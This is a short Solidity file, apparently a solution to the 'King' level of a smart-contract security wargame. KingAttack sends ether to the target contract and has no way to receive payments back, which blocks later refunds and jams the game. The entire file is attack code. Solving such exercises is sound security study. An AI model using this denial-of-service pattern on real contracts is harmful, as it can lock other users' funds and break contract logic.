// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./King.sol";

contract KingAttack {
    constructor(address payable to) public payable {
        (bool success, ) = to.call{value: msg.value}("");
        require(success, "Call failed");
    }
}
